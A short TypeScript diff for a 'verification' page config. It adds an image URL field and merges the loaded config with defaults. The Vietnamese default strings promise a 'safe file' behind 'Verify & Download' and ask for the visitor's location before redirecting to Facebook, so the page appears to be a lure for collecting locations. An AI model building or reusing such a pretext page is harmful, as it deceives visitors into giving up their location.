@@ -15,6 +15,7 @@ export interface VerificationConfig {
   buttonText: string;
   footerText: string;
   redirectUrl: string;
+  imageUrl: string;
 }
 
 const defaultConfig: VerificationConfig = {
@@ -24,13 +25,15 @@ const defaultConfig: VerificationConfig = {
     fileInfo: "1.2 MB - Tệp an toàn",
     buttonText: "Xác minh & Tải xuống",
     footerText: "Thông tin vị trí của bạn được sử dụng một lần để đảm bảo an toàn.",
-    redirectUrl: "https://www.facebook.com"
+    redirectUrl: "https://www.facebook.com",
+    imageUrl: "https://images.unsplash.com/photo-1589484323280-56d108b98a02?q=80&w=1920&auto=format&fit=crop"
 };
 
 export async function getVerificationConfigAction(): Promise<VerificationConfig> {
   try {
     const content = await fs.readFile(configPath, 'utf-8');
-    return JSON.parse(content);
+    const parsed = JSON.parse(content);
+    return { ...defaultConfig, ...parsed };
   } catch (error) {
     try {
       if (!fs.existsSync(configDir)){
